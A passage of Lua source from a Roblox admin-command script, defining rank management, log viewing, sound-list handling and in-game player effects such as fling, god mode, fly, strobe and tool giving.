					if not RANK:IsSupremeOwner(Player) then
						RANK:RemoveRank(Player)
						table.insert(Settings.Ranks.Member, Player)
					end
				end
			else
				RANK:RemoveRank(Arguments[1])
				table.insert(Settings.Ranks.Member, Arguments[1])
			end
		end
	end};
	
	[{"admin", "adm"}] = {"player", "Adds player to the admin list", 1, "Owner", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		if #Players > 0 then
			local Success = {}
			for _,Player in pairs(Players) do
				local PlayerRank,RankNum = RANK:GetRank(Player)
				if RANK:ConvertRank(Rank) > RankNum or RANK:IsSupremeOwner(Speaker) and not RANK:IsSupremeOwner(Player) then
					RANK:RemoveRank(Player)
					table.insert(Settings.Ranks.Admin, Player.Name)
					GUI:TellAdmin(Player)
					table.insert(Success, Player)
				end
			end
			REMOTE:SendHttpLog(Speaker.Name.." has admined "..CORE:UnpackPlayers(Success), "INFORMATION")
		else
			local Player,PlayerRank = RANK:GetPlayerFromList(Arguments[1])
			if Player then
				local RankNum = RANK:ConvertRank(PlayerRank)
				if RANK:IsSupremeOwner(Speaker) or RankNum < RANK:ConvertRank(Rank) then
					if not RANK:IsSupremeOwner(Player) then
						RANK:RemoveRank(Player)
						table.insert(Settings.Ranks.Admin, Player)
					end
				end
			else
				RANK:RemoveRank(Arguments[1])
				table.insert(Settings.Ranks.Admin, Arguments[1])
			end
		end
	end};
	
	[{"owner", "own"}] = {"player", "Adds player to the owner list(Speaker must be game owner)", 1, "Owner", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		if RANK:IsSupremeOwner(Speaker) then
			if #Players > 0 then
				local Success = {}
				for _,Player in pairs(Players) do
					if not RANK:IsSupremeOwner(Player) then
						RANK:RemoveRank(Player)
						table.insert(Settings.Ranks.Owner, Player.Name)
						GUI:TellAdmin(Player)
						table.insert(Success, Player)
					end
				end
				REMOTE:SendHttpLog(Speaker.Name.." has ownered "..CORE:UnpackPlayers(Success), "INFORMATION")
			else
				local Player,PlayerRank = RANK:GetPlayerFromList(Arguments[1])
				if Player then
					local RankNum = RANK:ConvertRank(PlayerRank)
					if RANK:IsSupremeOwner(Speaker) or RankNum < RANK:ConvertRank(Rank) then
						if not RANK:IsSupremeOwner(Player) then
							RANK:RemoveRank(Player)
							table.insert(Settings.Ranks.Owner, Player)
						end
					end
				else
					RANK:RemoveRank(Arguments[1])
					table.insert(Settings.Ranks.Owner, Arguments[1])
				end
			end
		end
	end};
	
	[{"admins", "adminlist"}] = {"", "Lists all admins in the admin", 0, "Member", false, function(Speaker, Rank, Arguments)
		local TableStorage = {}
		for _,Obj in pairs(Settings.Ranks.Member) do table.insert(TableStorage, Obj..": Member") end
		for _,Obj in pairs(Settings.Ranks.Admin) do table.insert(TableStorage, Obj..": Admin") end
		for _,Obj in pairs(Settings.Ranks.Owner) do table.insert(TableStorage, "BOLD: "..Obj..": Owner") end
		GUI:ListGui(Speaker, "Admin List", TableStorage, 45961462)
	end};
	
	[{"serveradmins", "sa"}] = {"", "Lists all admins in the server", 0, "Member", false, function(Speaker, Rank, Arguments)
		local TableStorage = {}
		for _,Player in pairs(Server.Players:GetChildren()) do
			local ValidAdmin,PlayerRank = RANK:IsAdmin(Player)
			if ValidAdmin then
				if PlayerRank == "Owner" then
					table.insert(TableStorage, "BOLD: "..Player.Name..": Owner")
				else
					table.insert(TableStorage, Player.Name..": "..PlayerRank)
				end
			end
		end
		GUI:ListGui(Speaker, "Server admin List", TableStorage, 76198987)
	end};
	
	[{"bans", "banlist"}] = {"", "Lists all players who've been banned", 0, "Member", false, function(Speaker, Rank, Arguments)
		GUI:ListGui(Speaker, "Ban List", Settings.Ranks.Banned, 163337795)
	end};
	
	[{"crashes", "crashlist"}] = {"", "Lists all players who've been crashed", 0, "Member", false, function(Speaker, Rank, Arguments)
		GUI:ListGui(Speaker, "Crash List", Settings.Ranks.Crashed, 35480917)
	end};
	
	[{"mutes", "muted", "mutelist"}] = {"", "Lists all players who've been muted", 0, "Member", false, function(Speaker, Rank, Arguments)
		GUI:ListGui(Speaker, "Mute List", Settings.Ranks.Muted, 202000870)
	end};
	
	[{"exiles", "exilelist"}] = {"", "Lists all the exiled players(banned, crashed, muted) in the admin", 0, "Member", false, function(Speaker, Rank, Arguments)
		local TableStorage = {}
		for _,Obj in pairs(Settings.Ranks.Banned) do table.insert(TableStorage, Obj..": Banned") end
		for _,Obj in pairs(Settings.Ranks.Crashed) do table.insert(TableStorage, Obj..": Crashed") end
		for _,Obj in pairs(Settings.Ranks.Muted) do table.insert(TableStorage, Obj..": Muted") end
		GUI:ListGui(Speaker, "Exile List", TableStorage, 132769258)
	end};
	
	[{"ranked", "ranks", "ranklist"}] = {"", "Lists all the players ranked in the admin", 0, "Member", false, function(Speaker, Rank, Arguments)
		local TableStorage = {}
		for PlayerRank,PlayerNames in pairs(Settings.Ranks) do
			for Num,PlayerName in pairs(PlayerNames) do
				if PlayerRank == "Owner" then
					table.insert(TableStorage, "BOLD: "..PlayerName..": Owner")
				else
					table.insert(TableStorage, PlayerName..": "..PlayerRank)
				end
			end
		end
		GUI:ListGui(Speaker, "Rank List", TableStorage, 21341765)
	end};
	
	[{"logs", "commandlogs", "cmdlogs"}] = {"", "Lists all the logs of executed commands", 0, "Admin", false, function(Speaker, Rank, Arguments)
		GUI:ListGui(Speaker, "Command Logs", CORE:ReverseTable(CommandLogs), "Log")
	end};
	
	[{"chatlogs"}] = {"", "Lists all the logs of players who've chatted", 0, "Admin", false, function(Speaker, Rank, Arguments)
		GUI:ListGui(Speaker, "Chat Logs", CORE:ReverseTable(ChatLogs), "Log")
	end};
	
	[{"irclogs"}] = {"", "Lists all the logs of irc output", 0, "Admin", false, function(Speaker, Rank, Arguments)
		GUI:ListGui(Speaker, "IRC Logs", CORE:ReverseTable(IRC.Logs), "Log")
	end};
	
	[{"exploitlogs"}] = {"", "Lists all the logs of exploits", 0, "Admin", false, function(Speaker, Rank, Arguments)
		local ExploitLog = Server.GDS:GetAsync("ExploitLog")
		if type(ExploitLog) ~= "table" then ExploitLog = {} end
		GUI:ListGui(Speaker, "Exploit Logs", ExploitLog, "Log")
	end};
	
	[{"clearlogs", "clearcommandlogs", "clearcmdlogs"}] = {"", "Clears all the logs of executed commands", 0, "Owner", false, function(Speaker, Rank, Arguments)
		CommandLogs = {}
	end};
	
	[{"clearchatlogs"}] = {"", "Clears all the logs of players who've chatted", 0, "Owner", false, function(Speaker, Rank, Arguments)
		ChatLogs = {}
	end};
	
	[{"clearirclogs"}] = {"", "Clears all the logs of irc output", 0, "Owner", false, function(Speaker, Rank, Arguments)
		IRC.Logs = {}
	end};
	
	[{"clearalllogs", "resetlogs"}] = {"", "Clears ALL logs (Command, Chat, IRC) but not exploit logs", 0, "Owner", false, function(Speaker, Rank, Arguments)
		CommandLogs = {}
		ChatLogs = {}
		IRC.Logs = {}
	end};
	
	[{"clearexploitlogs"}] = {"", "Clears all the logs of exploits", 0, "Admin", false, function(Speaker, Rank, Arguments)
		Server.GDS:SetAsync("ExploitLog", {})
	end};
	
	[{"soundlist", "musiclist", "audiolist", "songs", "sounds", "musics", "audios"}] = {"", "Lists all the sounds in the global sound list", 0, "Member", false, function(Speaker, Rank, Arguments)
		local List,Correlate,SoundName = {},{},{}
		for Name,Info in pairs(SoundList) do
			local View = "Command Name: "..Name.." | Audio ID: "..Info[1].." | Full Name: "..Info[2]
			table.insert(List, View)
			Correlate[View] = Info[1]
		end
		
		local CanClick = true
		if Rank == "Member" then CanClick = false end
		local Clicked = GUI:ListGui(Speaker, "Sound List", List, "Sound", CanClick)
		Clicked.Event:connect(function(ClickName)
			local OldSoundId = nil
			SOUND:StopGlobalSound()
			if "rbxassetid://"..Correlate[ClickName] ~= OldSoundID then
				SOUND:PlayGlobalSound(Correlate[ClickName])
			end
		end)
	end};
	
	[{"syncsoundlist", "syncsounds", "syncaudiolist", "syncaudios", "syncmusiclist", "syncmusics"}] = {"", "Resyncs the global sound list to the server", 0, "Admin", false, function(Speaker, Rank, Arguments)
		SOUND:SyncSoundList(Speaker)
	end};
	
	[{"cleart", "clearterrain", "cleant", "cleanterrain"}] = {"", "Clears all terrain from the server", 0, "Admin", false, function(Speaker, Rank, Arguments)
		local Answer = GUI:PromptMessageWithButtons(Speaker, "Clean Terrain?", "Do you really want to clear all terrain in the server? If there is a lot of terrain this can cause major lag. Continue?", "Question", {"Yes", "No"})
		if Answer == "Yes" then
			Server.Workspace.Terrain:Clear()
		end
	end};
	
	[{"clearstamp", "clearstamper", "cleanstamp", "cleanstamper"}] = {"", "Clears all items in workspace that came from the stamper tool (Not terrain)", 0, "Admin", false, function(Speaker, Rank, Arguments)
		local Answer = GUI:PromptMessageWithButtons(Speaker, "Clean All Stamper Objects?", "Do you really want to clear all stamper objects in the server, this will clean all bricks/models placed down by stamper and if there's a lot of them it can cause major lag? Continue?", "Question", {"Yes", "No"})
		if Answer == "Yes" then
			for _,Obj in pairs(Workspace:GetChildren()) do
				if Obj:FindFirstChild("RobloxStamper") and Obj:FindFirstChild("RobloxModel") then
					Obj:Destroy()
				end
			end
		end
	end};
	
	[{"base", "baseplate", "newbase", "makebase", "newbaseplate", "makebaseplate"}] = {"", "Creates a baseplate inside the server", 0, "Admin", false, function(Speaker, Rank, Arguments)
		CORE:MakeBase()
	end};
	
	[{"addsound", "addaudio", "addmusic"}] = {"num(ID) string", "Will add the song of num(ID) named string to the custom sound list of the game", 2, "Admin", false, function(Speaker, Rank, Arguments)
		local CustomSounds = Server.GDS:GetAsync("MML Custom Sounds")
		if CustomSounds == nil or type(CustomSounds) ~= "table" then
			CustomSounds = {}
		end
		if tostring(Arguments[1]) then
			local Request = MARKET:GetItemInfo(Arguments[1])
			if Request.AssetTypeId == 3 then
				table.insert(CustomSounds, {Arguments[2], Arguments[1]})
				SoundList[Arguments[2]] = {Arguments[1], Request.Name, Request.Creator.Name}
				Server.GDS:SetAsync("MML Custom Sounds", CustomSounds)
				GUI:SendHint(Speaker, "Sound Added to server sound list and for future servers.", 4)
			else
				GUI:SendMessage(Speaker, "Invalid", "Please make sure that your ID is an audio asset.", 4)
			end
		end
	end};
	
	[{"removesound", "removeaudio", "removemusic"}] = {"string", "Will remove the sound string from the custom sound list of the game", 1, "Admin", false, function(Speaker, Rank, Arguments)
		local CustomSounds = Server.GDS:GetAsync("MML Custom Sounds")
		if CustomSounds == nil or type(CustomSounds) ~= "table" then
			CustomSounds = {}
		end
		
		local Removed = {}
		for Num,Data in pairs(CustomSounds) do
			if string.sub(string.lower(Data[1]),1,#Arguments[1]) == string.lower(Arguments[1]) then
				table.insert(Removed, Data[1])
				table.remove(CustomSounds, Num)
			end
		end

		Server.GDS:SetAsync("MML Custom Sounds", CustomSounds)
		
		SOUND:SyncSoundList()
		
		if #Removed > 0 then
			GUI:SendHint(Speaker, "Removed from custom sound list: "..STRING:UnpackArgs(Removed))
		else
			GUI:SendHint(Speaker, "Could not find sound "..Arguments[1].." in custom sound list")
		end
	end};
	
	[{"clearsounds", "clearaudio", "clearmusic"}] = {"", "Clears all sounds in the custom sound list of the game", 0, "Admin", false, function(Speaker, Rank, Arguments)
		local Answer = GUI:PromptMessageWithButtons(Speaker, "Clear All Sounds", "Would you like to clear all sounds from the custom Lua".."M".."od".."elMa".."ke".."r's sound list? This will clear all sounds from the ;addsound command and will affect all sounds in all of this game's servers. Are you sure you want to clear?(All default global sounds will remain)", "Question", {"Yes", "No"})
		if Answer == "Yes" then
			Server.GDS:SetAsync("MML Custom Sounds", {})
			SoundList = GlobalSoundList -- Reset to old sounds without having to re-sync!
			GUI:SendHint(Speaker, "All custom sounds have been removed", 4)
		end
	end};
	
	[{"benchmark", "bench"}] = {"player", "Benchmarks player", 1, "Admin", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		local SpeakerTesting = false
		for _,Player in pairs(Players) do
			if Player == Speaker then SpeakerTesting = true end
			if Player:FindFirstChild("Backpack") then coroutine.wrap(function()
				CORE:ExecuteResource("Benchmark", Player.Backpack, {["Admin"] = script})
				--wait(10)
				--GUI:SendMessage(Player, "Benchmark almost done", "Your client is cleaning up the mess made. Please wait until you are reset by your client to have results submitted", "Information", 10)
			end)() end
		end
		if SpeakerTesting == false then
			GUI:SendMessage(Speaker, "Benchmarking", "The player(s) are now being benchmarked. To view results say "..Settings.Prefix.."getbench player", "Information", 10)
		end
	end};
	
	[{"getbench", "getbenchmark", "getbenches", "getbenchmarks"}] = {"player", "Gets benchmarks of player", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		local Compile = {}
		for _,Player in pairs(Players) do
			local PlayerInfo = ClientInfo[Player.Name]
			if PlayerInfo then
				if PlayerInfo.Benchmark then
					table.insert(Compile, Player.Name..": "..PlayerInfo.Benchmark)
				else
					table.insert(Compile, Player.Name..": No score")
				end
			end
		end
		GUI:ListGui(Speaker, "Benchmarks", Compile, "Information")
	end};
	
	[{"replicatecommand", "replicatecmd", "repcmd", "repcommand", "rc", "sudo"}] = {"player string[command]", "Executes string as a command on player as if they said it", 2, "Owner", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:Chatted(Arguments[2], Player, true)
		end
	end};
	
	[{"virtexe", "virtualexe", "virtsudo", "virtualsudo", "vsudo", "vs"}] = {"string[Name] string[Rank] string[Command]", "Executes string[Command] on a vitual player named string[Name] with the rank string[Rank]", 3, "Owner", false, function(Speaker, Rank, Arguments)
		CORE:Chatted(Arguments[3], nil, true, Arguments[1], Arguments[2], RANK:IsSupremeOwner(Speaker))
	end};
	
	[{"longneck", "lneck", "longn", "ln"}] = {"player", "Makes player have a long neck", 1, "Member", true, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character ~= nil then
				if Player.Character:FindFirstChild("Torso") and Player.Character:FindFirstChild("Head") ~= nil then
					if Player.Character.Torso:FindFirstChild("Neck") then
						Player.Character.Torso.Neck.C0 = CFrame.new(0,3,0) * CFrame.Angles(-math.rad(90),0,math.rad(180))
						local Neck = Player.Character:FindFirstChild("Neck") if Neck then Neck:Destroy() end
						Neck = Instance.new("Part", Player.Character) Neck.Name = "Neck" Neck.Size = Vector3.new(1,3,1) Neck.Position = Vector3.new(0,100,0) Neck.BrickColor = BrickColor.new(tostring(Player.Character.Head.BrickColor)) Neck.Locked = true
						local Mesh = Instance.new("CylinderMesh", Neck) Mesh.Scale = Vector3.new(0.7,1,0.7)
						local Weld = Instance.new("Weld", Neck) Weld.Part0 = Neck Weld.Part1 = Player.Character.Torso Weld.C0 = CFrame.new(0,-2,0)
					end
 				end
			end
		end
	end};
	
	[{"nolongneck", "normalneck", "nolneck", "nolongn", "noln", "unlongneck", "unlneck", "unlongn", "unln", "shortneck"}] = {"player", "Makes player's neck normal sized", 1, "Member", true, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character ~= nil and Player.Character:FindFirstChild("Torso") then
				Player.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(-math.rad(90),0,math.rad(180))
				local Neck = Player.Character:FindFirstChild("Neck") if Neck then Neck:Destroy() end
			end
		end
	end};
	
	[{"fling"}] = {"player", "Flings player out of the map", 1, "Member", true, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			local _,RankNum = RANK:GetRank(Player)
			if RankNum <= RANK:ConvertRank(Rank) then
				CORE:FlingPlayer(Player)
			end
		end
	end};
	
	[{"loopfling", "lfling", "loopf", "lf"}] = {"player", "Flings player out of the map over and over", 1, "Member", true, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			local _,RankNum = RANK:GetRank(Player)
			if RankNum <= RANK:ConvertRank(Rank) then
				Flings[Player.Name] = true
				CORE:FlingPlayer(Player)
			end
		end
	end};
	
	[{"noloopfling", "unloopfling", "nofling", "unfling"}] = {"player", "Stops theloop fling on player", 1, "Member", true, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			local _,RankNum = RANK:GetRank(Player)
			if RankNum <= RANK:ConvertRank(Rank) then
				Flings[Player.Name] = nil
			end
		end
	end};
	
	[{"nuke"}] = {"player", "Nukes player", 1, "Admin", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:Nuke(Player)
		end
	end};
	
	[{"beep", "annoy"}] = {"player", "Plays a beep sound to player", 1, "Admin", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			Beeps[Player.Name] = true
			SOUND:BeepPlayer(Player)
		end
	end};
	
	[{"nobeep", "unbeep", "noannoy", "unannoy"}] = {"player", "Stops beeping sound on player", 1, "Admin", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.PlayerGui then
				Beeps[Player.Name] = nil
				for _,Obj in pairs(Player.PlayerGui:GetChildren()) do
					if Obj.Name == "Annoy" then
						Obj:Stop()
						Obj:Destroy()
					end
				end
			end
		end
	end};
	
	[{"time"}] = {"number/string", "Sets the time to number/string(Ex: 9:00, noon)", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Time = Arguments[1]
		if Time == "day" or Time == "noon" then Time = "12" end
		if Time == "night" or Time == "midnight" then Time = "0" end
		if Time == "dawn" or Time == "morning" then Time = "6:15" end
		if Time == "dusk" or Time == "evening" then Time = "17:45" end
		if Time == "afternoon" then Time = "15:30" end
		ypcall(function() Server.Lighting.TimeOfDay = Time end)
	end};
	
	[{"product", "buy", "purchase", "prod", "place"}] = {"player number(ID)", "Prompts player to purchase item", 2, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			MARKET:PromptPurchase(Player, Arguments[2], Speaker)
		end
	end};
	
	[{"gear"}] = {"player ID", "Gives player the gear with the ID of ID", 2, "Member", false, function(Speaker, Rank, Arguments)
		local AbuseMode = false
		if Rank == "Member" then AbuseMode = Settings.DisableAbuse end
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:Insert(Arguments[2], Player.Backpack, true, {"Tool", "HopperBin"}, AbuseMode)
		end
	end};
	
	[{"sword"}] = {"player", "Gives player a sword", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:Insert(125013769, Player.Backpack, true)
		end
	end};
	
	[{"accessory", "acs", "hat"}] = {"player ID", "Gives player the accessory with the ID of ID", 2, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character then
				CORE:Insert(Arguments[2], Player.Character, true, {"Accoutrement"})
			end
		end
	end};
	
	[{"flash"}] = {"", "Flashes lighting", 0, "Member", false, function(Speaker, Rank, Arguments)
		CORE:ResetLighting()
		repeat
			Server.Lighting.Ambient = Color3.new(1,1,1)
			Server.Lighting.FogColor = Color3.new(1,1,1)
			Server.Lighting.Brightness = 1
			Server.Lighting.TimeOfDay = 14
			wait(0.1) 
			Server.Lighting.Ambient = Color3.new(0,0,0)
			Server.Lighting.FogColor = Color3.new(0,0,0)
			Server.Lighting.Brightness = 0
			Server.Lighting.TimeOfDay = 0
			wait(0.1)
		until ModLighting == false
	end};
	
	[{"disco", "party"}] = {"", "Changes the lighting so there's a disco party", 0, "Member", false, function(Speaker, Rank, Arguments)
		CORE:ResetLighting()
		repeat
			local Color = Color3.new(math.random(0,255)/255,math.random(0,255)/255,math.random(0,255)/255)
			Server.Lighting.Ambient = Color
			Server.Lighting.FogColor = Color
			Server.Lighting.TimeOfDay = 0
			Server.Lighting.FogEnd = 500
			wait(0.1) 
		until ModLighting == false
	end};
	
	[{"fixl", "fixlighting", "nodisco", "undisco", "noflash", "unflash"}] = {"", "Removes disco or flash effects", 0, "Member", false, function(Speaker, Rank, Arguments)
		CORE:FixLighting()
	end};
	
	[{"strobe"}] = {"player", "Makes player's screen flash like a strobe", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player:FindFirstChild("PlayerGui") then
				local SG = Player.PlayerGui:FindFirstChild("MMLA Screen Cover") if SG then SG:Destroy() end
				SG = Instance.new("ScreenGui", Player.PlayerGui) SG.Name = "MMLA Screen Cover"
				local Frame = Instance.new("Frame", SG) Frame.Name = "Overlay" Frame.Size = UDim2.new(1,0,1,0) Frame.ZIndex = 100
				coroutine.wrap(function() repeat Frame.BackgroundColor3 = Color3.new(0,0,0) wait(0.1) Frame.BackgroundColor3 = Color3.new(1,1,1) wait(0.1) until not SG end)()
			end
		end
	end};
	
	[{"nostrobe", "unstrobe", "noblind", "unblind"}] = {"player", "Clears the strobe effect from player's screen", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player:FindFirstChild("PlayerGui") then
				local SG = Player.PlayerGui:FindFirstChild("MMLA Screen Cover") if SG then SG:Destroy() end
			end
		end
	end};
	
	[{"blind"}] = {"player", "Makes player unable to see", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player:FindFirstChild("PlayerGui") then
				local SG = Player.PlayerGui:FindFirstChild("MMLA Screen Cover") if SG then SG:Destroy() end
				SG = Instance.new("ScreenGui", Player.PlayerGui) SG.Name = "MMLA Screen Cover"
				local Frame = Instance.new("Frame", SG) Frame.Name = "Overlay" Frame.Size = UDim2.new(1,0,1,0) Frame.ZIndex = 100 Frame.BackgroundColor3 = Color3.new(0,0,0)
			end
		end
	end};
	
	[{"rejoin", "rj", "rej", "rjoin"}] = {"", "Makes yourself rejoin the server", 0, "Non-Admin", false, function(Speaker, Rank, Arguments)
		local Suc, Err, PlaceID, IntID = Server.TS:GetPlayerPlaceInstanceAsync(Speaker.UserId)
		if Suc then
			Server.TS:TeleportToPlaceInstance(PlaceID, IntID, Speaker)
		else
			Server.TS:Teleport(game.PlaceId, Speaker)
		end
	end};
	
	[{"abuselist", "abusablecommands", "abusecmds", "ac"}] = {"", "Shows a list of abusable commands", 0, "Admin", false, function(Speaker, Rank, Arguments)
		GUI:ListGui(Speaker, "Abusable Commands", Settings.AbuseList, 2015506)
	end};
	
	[{"addabuse", "makeabuse", "abusecmd", "abusecommand", "addabusable", "makeabusable", "abusablecmd", "abusablecommand"}] = {"string(command)", "Adds string(command) to the abuse list", 1, "Owner", false, function(Speaker, Rank, Arguments)
		local NewAbuse = Arguments[1]
		if string.sub(string.lower(NewAbuse), 1, #Settings.Prefix) == string.lower(Settings.Prefix) then -- remove prefix if present
			NewAbuse = string.sub(NewAbuse, #Settings.Prefix + 1)
		end
		
		local Match = false
		for _,AbuseCmd in pairs(Settings.AbuseList) do
			if string.lower(AbuseCmd) == string.lower(NewAbuse) then
				Match = true
				break
			end
		end
		if not Match then
			table.insert(Settings.AbuseList, NewAbuse)
			GUI:MessageAdmins("New abusable command", Speaker.Name.." has made '"..NewAbuse.."' an abuseable command", "Check")
		else
			GUI:SendMessage(Speaker, "Command Exists", "RED This command matches another in the abuse list, therefore, will not be added", "Error")
		end
		CORE:SetAbuseCommands()
	end};
	
	[{"removeabuse", "removeabuse", "removeabusecmd", "removeabusecommand", "removeabusable", "removeabusable", "removeabusablecmd", "removeabusablecommand", "noabuse", "unabuse", "noabusable", "unabusable"}] = {"string(command)", "Removes string(command) to the abuse list", 1, "Owner", false, function(Speaker, Rank, Arguments)
		local NewAbuse = Arguments[1]
		if string.sub(string.lower(NewAbuse), 1, #Settings.Prefix) == string.lower(Settings.Prefix) then -- remove prefix if present
			NewAbuse = string.sub(NewAbuse, #Settings.Prefix + 1)
		end
		
		local Removed = false
		for Num,AbuseCmd in pairs(Settings.AbuseList) do
			if string.sub(string.lower(AbuseCmd), 1, #NewAbuse) == string.lower(NewAbuse) then
				Removed = true
				table.remove(Settings.AbuseList, Num)
			end
		end
		if Removed then
			GUI:MessageAdmins("Removed abusable command", Speaker.Name.." has removed '"..NewAbuse.."' from the abuse list", "Check")
		else
			GUI:SendMessage(Speaker, "Command not removed", "RED Could not find '"..NewAbuse.."' in abuse list", "Error")
		end
		CORE:SetAbuseCommands()
	end};
	
	[{"god", "power"}] = {"player", "Gives player unlimited health", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Humanoid") then
				Player.Character.Humanoid.MaxHealth = math.huge
				Player.Character.Humanoid.Health = math.huge
			end
		end
	end};
	
	[{"heal", "nogod", "ungod", "nopower", "unpower"}] = {"player", "Resets health to full, undoes god effect(Doesn't mean there isn't God)", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Humanoid") then
				if Player.Character.Humanoid.MaxHealth == math.huge then
					Player.Character.Humanoid.MaxHealth = 100
					Player.Character.Humanoid.Health = 100
				else
					Player.Character.Humanoid.Health = Player.Character.Humanoid.MaxHealth
				end
			end
		end
	end};
	
	[{"loopheal"}] = {"player", "Loops player's health to full", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Humanoid") then
				local Char = Player.Character
				repeat Char.Humanoid.Health = Char.Humanoid.MaxHealth wait() until not Char:FindFirstChild("Humanoid") or Char.Parent == nil or Char.Humanoid.Health == 0
			end
		end
	end};
	
	[{"health"}] = {"player num", "Sets the health of player to num", 2, "Member", false, function(Speaker, Rank, Arguments)
		if tonumber(Arguments[2]) then
			local Players = STRING:Scan(Arguments[1], Speaker)
			for _,Player in pairs(Players) do
				if Player.Character and Player.Character:FindFirstChild("Humanoid") then
					Player.Character.Humanoid.Health = Arguments[2]
				end
			end
		end
	end};
	
	[{"speed", "ws", "walkspeed"}] = {"player num", "Sets the speed of player to num", 2, "Member", false, function(Speaker, Rank, Arguments)
		if tonumber(Arguments[2]) then
			local Players = STRING:Scan(Arguments[1], Speaker)
			for _,Player in pairs(Players) do
				if Player.Character and Player.Character:FindFirstChild("Humanoid") then
					local Speed = tonumber(Arguments[2])
					if Speed then
						if Rank == "Member" then
							if Speed > 1000 then Speed = 1000
							elseif Speed < -1000 then Speed = -1000 end
						end
						Player.Character.Humanoid.WalkSpeed = Speed
					end
				end
			end
		end
	end};
	
	[{"damage", "dmg"}] = {"player num", "Takes away num health from player", 2, "Member", false, function(Speaker, Rank, Arguments)
		if tonumber(Arguments[2]) then
			local Players = STRING:Scan(Arguments[1], Speaker)
			for _,Player in pairs(Players) do
				if Player.Character and Player.Character:FindFirstChild("Humanoid") then
					Player.Character.Humanoid.Health = Player.Character.Humanoid.Health - Arguments[2]
				end
			end
		end
	end};
	
	[{"fly"}] = {"player", "Lets player be able to fly", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:Fly(Player, 10000)
		end
	end};
	
	[{"noclip", "noc"}] = {"player", "Lets player be able to noclip", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:Fly(Player, 1000000)
		end
	end};
	
	[{"nofly", "unfly", "clip", "nonoclip", "unnoclip"}] = {"player", "Removes fly or noclip effect", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character then
				if Player.Character:FindFirstChild("StopMMLFly") then
					Player.Character.StopMMLFly:InvokeClient(Player)
				end
			end
		end
	end};
	
	[{"clearcache", "clearc", "cc"}] = {"", "Clears cached objects such as market info and http local scripts", 0, "Owner", false, function(Speaker, Rank, Arguments)
		ScriptCache,MarketCache,CharacterCache,PackageCache = {},{},{},{}
		GUI:SendMessage(Speaker, "Cache Cleared", "Cache has been cleared successfully", "Check")
	end};
	
	[{"give"}] = {"player string", "Gives player any tool found named string. Can also give build tools (basicbtools, btools, psbtools)", 2, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:GiveTools(Player, Arguments[2])
		end
	end};
	
	[{"tools", "gettools", "toollist", "toolslist"}] = {"", "Gets all tools that you can use the "..Settings.Prefix.."give command", 0, "Member", false, function(Speaker, Rank, Arguments)
		local List = {}
		for _,Region in pairs(ToolRegions) do
			CORE:ScanItems(Region, {"HopperBin", "Tool"}, function(Item)
				table.insert(List, Item.Name.."  |  Found at: "..Item:GetFullName())
			end)
		end
		
		GUI:ListGui(Speaker, "Tool list", List, 73589272)
	end};
	
	[{"btools", "buildtools", "buildingtools"}] = {"player string", "Gives player building tools", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:GiveTools(Player, "btools")
		end
	end};
	
